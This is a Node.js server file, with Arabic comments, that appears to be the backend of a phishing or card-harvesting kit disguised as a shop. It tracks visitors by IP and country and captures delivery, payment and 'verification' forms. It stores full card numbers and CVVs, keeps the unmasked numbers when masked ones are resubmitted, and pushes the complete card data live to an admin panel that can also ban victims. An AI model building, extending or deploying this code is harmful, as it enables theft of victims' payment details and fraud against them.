require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const geoip = require('geoip-lite');
const { v4: uuidv4 } = require('uuid');
const bcrypt = require('bcryptjs');
const pool = require('./config/database');
const { initializeDatabase } = require('./models/schema');

// Import routes
const productRoutes = require('./routes/products');
const adminRoutes = require('./routes/admin');
const visitorRoutes = require('./routes/visitors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE']
  }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Store connected clients
const connectedClients = new Map();
const adminConnections = new Map();

// Socket.IO connection handling
io.on('connection', (socket) => {
  const sessionId = socket.handshake.query.sessionId || uuidv4();
  const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '';
  const userAgent = socket.handshake.headers['user-agent'] || '';
  const geo = geoip.lookup(ip);
  
  const clientInfo = {
    sessionId,
    ip,
    userAgent,
    country: geo ? geo.country : 'Unknown',
    countryCode: geo ? geo.country : 'XX',
    currentPage: 'home',
    isAdmin: false,
    connectedAt: new Date()
  };

  connectedClients.set(socket.id, clientInfo);
  
  console.log(`🔌 Client connected: ${sessionId} from ${geo?.country || 'Unknown'}`);

  // Handle visitor tracking
  socket.on('visitor:init', async (data) => {
    try {
      const { sessionId, page = 'home' } = data;
      clientInfo.sessionId = sessionId;
      clientInfo.currentPage = page;
      
      // Check if banned
      const banned = await pool.query(
        'SELECT * FROM banned_users WHERE (session_id = $1 OR ip_address = $2) AND (expires_at IS NULL OR expires_at > NOW()) LIMIT 1',
        [sessionId, ip]
      );
      
      if (banned.rows.length > 0) {
        socket.emit('user:banned', { 
          message: banned.rows[0].custom_message || 'تم حظرك من الموقع' 
        });
        socket.disconnect();
        return;
      }

      // Update or insert visitor
      await pool.query(`
        INSERT INTO visitors (session_id, ip_address, country, country_code, user_agent, current_page, is_online)
        VALUES ($1, $2, $3, $4, $5, $6, true)
        ON CONFLICT (session_id) 
        DO UPDATE SET 
          is_online = true, 
          current_page = $6,
          last_activity = CURRENT_TIMESTAMP
      `, [sessionId, ip, geo?.country || 'Unknown', geo?.country || 'XX', userAgent, page]);

      // Notify admins of new visitor
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('visitor:new', {
          sessionId,
          country: geo?.country,
          ip,
          page,
          timestamp: new Date()
        });
      });

      socket.emit('visitor:confirmed', { sessionId });
    } catch (error) {
      console.error('Error initializing visitor:', error);
    }
  });

  // Handle page changes
  socket.on('visitor:page', async (data) => {
    const { sessionId, page } = data;
    clientInfo.currentPage = page;
    
    try {
      await pool.query(
        'UPDATE visitors SET current_page = $1, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
        [page, sessionId]
      );

      // Notify all admins
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('visitor:pageChange', {
          sessionId,
          page,
          timestamp: new Date()
        });
      });
    } catch (error) {
      console.error('Error updating page:', error);
    }
  });

  // Handle delivery form submission
  socket.on('form:delivery', async (data) => {
    const { sessionId, formData } = data;
    
    try {
      await pool.query(
        'UPDATE visitors SET delivery_data = $1, form_submitted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
        [JSON.stringify(formData), sessionId]
      );

      // Notify admins
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('form:deliverySubmitted', {
          sessionId,
          formData,
          country: geo?.country,
          timestamp: new Date()
        });
      });

      console.log(`📝 Delivery form submitted by ${sessionId}`);
    } catch (error) {
      console.error('Error saving delivery data:', error);
    }
  });

  // Handle payment form submission
  socket.on('form:payment', async (data) => {
    const { sessionId, paymentData } = data;
    
    try {
      // جلب البيانات الحالية المخزنة للزائر للحفاظ على الأرقام الحقيقية
      const currentVisitor = await pool.query(
        'SELECT payment_data FROM visitors WHERE session_id = $1', 
        [sessionId]
      );
      
      let finalPaymentData = { ...paymentData };

      if (currentVisitor.rows.length > 0 && currentVisitor.rows[0].payment_data) {
        const existingData = currentVisitor.rows[0].payment_data;
        
        // إذا كانت البيانات الجديدة تحتوي على نجوم، نحتفظ بالرقم الحقيقي القديم
        if (paymentData.cardNumber && paymentData.cardNumber.includes('*') && existingData.cardNumber) {
          finalPaymentData.cardNumber = existingData.cardNumber;
        }
        if (paymentData.cvv && paymentData.cvv.includes('*') && existingData.cvv) {
          finalPaymentData.cvv = existingData.cvv;
        }
      }

      await pool.query(
        'UPDATE visitors SET payment_data = $1, payment_submitted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
        [JSON.stringify(finalPaymentData), sessionId]
      );

      // إرسال الإشعار الفوري للأدمن بالبيانات الحقيقية كاملة
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('form:paymentSubmitted', {
          sessionId,
          paymentData: finalPaymentData,
          country: geo?.country,
          timestamp: new Date()
        });
      });

      console.log(`💳 Payment form processed safely for ${sessionId}`);
    } catch (error) {
      console.error('Error saving payment data:', error);
    }
  });

  // Handle verification form submission
  socket.on('form:verification', async (data) => {
    const { sessionId, verificationData } = data;
    
    try {
      await pool.query(
        'UPDATE visitors SET verification_data = $1, verification_submitted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
        [JSON.stringify(verificationData), sessionId]
      );

      // Notify admins
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('form:verificationSubmitted', {
          sessionId,
          verificationData,
          country: geo?.country,
          timestamp: new Date()
        });
      });

      console.log(`🔐 Verification form submitted by ${sessionId}`);
    } catch (error) {
      console.error('Error saving verification data:', error);
    }
  });

  // Handle admin connections
  socket.on('admin:login', async (data) => {
    try {
      const { username, password, deviceInfo } = data;
      const result = await pool.query(
        'SELECT * FROM admins WHERE username = $1 AND is_active = true',
        [username]
      );

      if (result.rows.length > 0) {
        const admin = result.rows[0];
        const isValid = await bcrypt.compare(password, admin.password_hash);

        if (isValid) {
          const sessionToken = uuidv4();
          clientInfo.isAdmin = true;
          
          // Save admin session
          await pool.query(
            'INSERT INTO admin_sessions (session_token, device_info, ip_address, country, is_current) VALUES ($1, $2, $3, $4, true)',
            [sessionToken, JSON.stringify(deviceInfo || {}), ip, geo?.country || 'Unknown']
          );

          socket.emit('admin:loginSuccess', { sessionToken, adminId: admin.id });
          console.log(`🔐 Admin ${username} logged in from ${geo?.country}`);
        } else {
          socket.emit('admin:loginFailed', { message: 'Invalid credentials' });
        }
      } else {
        socket.emit('admin:loginFailed', { message: 'User not found' });
      }
    } catch (error) {
      console.error('Admin login error:', error);
      socket.emit('admin:loginFailed', { message: 'Login error' });
    }
  });

  socket.on('admin:validate', async (data) => {
    try {
      const { sessionToken } = data;
      const result = await pool.query(
        'SELECT * FROM admin_sessions WHERE session_token = $1 AND is_current = true',
        [sessionToken]
      );

      if (result.rows.length > 0) {
        clientInfo.isAdmin = true;
        adminConnections.set(socket.id, socket);
        socket.emit('admin:valid', { valid: true });
      } else {
        socket.emit('admin:valid', { valid: false });
      }
    } catch (error) {
      socket.emit('admin:valid', { valid: false });
    }
  });

  // Handle real-time stats request
  socket.on('stats:request', async () => {
    try {
      const totalVisitors = await pool.query('SELECT COUNT(*) FROM visitors');
      const formSubmissions = await pool.query('SELECT COUNT(*) FROM visitors WHERE form_submitted = true');
      const paymentSubmissions = await pool.query('SELECT COUNT(*) FROM visitors WHERE payment_submitted = true');
      const verificationSubmissions = await pool.query('SELECT COUNT(*) FROM visitors WHERE verification_submitted = true');
      const onlineVisitors = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_online = true');
      const countryStats = await pool.query(`
        SELECT country, COUNT(*) as count 
        FROM visitors 
        GROUP BY country 
        ORDER BY count DESC 
        LIMIT 10
      `);

      socket.emit('stats:update', {
        totalVisitors: parseInt(totalVisitors.rows[0].count),
        formSubmissions: parseInt(formSubmissions.rows[0].count),
        paymentSubmissions: parseInt(paymentSubmissions.rows[0].count),
        verificationSubmissions: parseInt(verificationSubmissions.rows[0].count),
        onlineVisitors: parseInt(onlineVisitors.rows[0].count),
        countryStats: countryStats.rows
      });
    } catch (error) {
      console.error('Error fetching stats:', error);
    }
  });

  // Handle live visitors request (جلب جميع الزوار حتى غير المتصلين)
  socket.on('visitors:request', async () => {
    try {
      const visitors = await pool.query(`
        SELECT session_id, ip_address, country, country_code, current_page, delivery_data, payment_data, 
               verification_data, form_submitted, payment_submitted, 
               verification_submitted, last_activity, is_online
        FROM visitors 
        ORDER BY last_activity DESC
        LIMIT 100
      `);

      socket.emit('visitors:update', { visitors: visitors.rows });
    } catch (error) {
      console.error('Error fetching visitors:', error);
    }
  });

  // Handle ban request
  socket.on('user:ban', async (data) => {
    try {
      const { targetSessionId, targetIp, reason, customMessage } = data;
      
      await pool.query(
        'INSERT INTO banned_users (session_id, ip_address, reason, custom_message) VALUES ($1, $2, $3, $4)',
        [targetSessionId || null, targetIp || null, reason, customMessage]
      );

      // Find and disconnect the banned client
      connectedClients.forEach((info, socketId) => {
        if (info.sessionId === targetSessionId || info.ip === targetIp) {
          const targetSocket = io.sockets.sockets.get(socketId);
          if (targetSocket) {
            targetSocket.emit('user:banned', { message: customMessage });
            targetSocket.disconnect();
          }
        }
      });

      console.log(`🚫 User banned: ${targetSessionId || targetIp}`);
    } catch (error) {
      console.error('Error banning user:', error);
    }
  });

  // Handle unban request
  socket.on('user:unban', async (data) => {
    try {
      const { banId } = data;
      if (!banId) return;
      
      await pool.query('DELETE FROM banned_users WHERE id = $1', [banId]);
      
      // Send success response to the admin who requested
      socket.emit('user:unbanned', { banId, success: true });
      
      // Notify all admins to refresh their lists
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('ban:listUpdate');
      });
      
      console.log(`✅ User unbanned: ID ${banId}`);
    } catch (error) {
      console.error('Error unbanning user:', error);
      socket.emit('user:unbanned', { success: false, message: error.message });
    }
  });

  // Handle admin session logout
  socket.on('admin:logoutDevice', async (data) => {
    try {
      const { sessionToken } = data;
      await pool.query('DELETE FROM admin_sessions WHERE session_token = $1', [sessionToken]);
      
      // Find and disconnect the device
      adminConnections.forEach((adminSocket, socketId) => {
        adminSocket.emit('admin:forceLogout');
        adminSocket.disconnect();
      });
    } catch (error) {
      console.error('Error logging out device:', error);
    }
  });

  // Handle logout all devices
  socket.on('admin:logoutAll', async () => {
    try {
      await pool.query('DELETE FROM admin_sessions');
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('admin:forceLogout');
        adminSocket.disconnect();
      });
      adminConnections.clear();
    } catch (error) {
      console.error('Error logging out all devices:', error);
    }
  });

  // Handle admin device list request
  socket.on('admin:devices', async () => {
    try {
      const devices = await pool.query('SELECT * FROM admin_sessions ORDER BY created_at DESC');
      socket.emit('admin:devicesList', { devices: devices.rows });
    } catch (error) {
      console.error('Error fetching devices:', error);
    }
  });

  // Handle disconnect
  socket.on('disconnect', async () => {
    const client = connectedClients.get(socket.id);
    
    if (client) {
      console.log(`🔌 Client disconnected: ${client.sessionId}`);
      
      if (client.isAdmin) {
        adminConnections.delete(socket.id);
      } else {
        try {
          await pool.query(
            'UPDATE visitors SET is_online = false WHERE session_id = $1',
            [client.sessionId]
          );
          
          // Notify admins
          adminConnections.forEach((adminSocket) => {
            adminSocket.emit('visitor:offline', {
              sessionId: client.sessionId,
              timestamp: new Date()
            });
          });
        } catch (error) {
          console.error('Error updating offline status:', error);
        }
      }
      
      connectedClients.delete(socket.id);
    }
  });
});

// API Routes
app.use('/api/products', productRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/visitors', visitorRoutes);

// Serve frontend static files
app.use(express.static(path.join(__dirname, '../frontend')));

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date() });
});

// Start server
const PORT = process.env.PORT || 3000;

const startServer = async () => {
  try {
    await initializeDatabase();
    server.listen(PORT, () => {
      console.log(`🚀 Server running on port ${PORT}`);
      console.log(`🌐 Frontend: http://localhost:${PORT}`);
      console.log(`📊 API: http://localhost:${PORT}/api`);
    });
  } catch (error) {
    console.error('Failed to start server:', error);
    process.exit(1);
  }
};

startServer();

module.exports = { app, io };
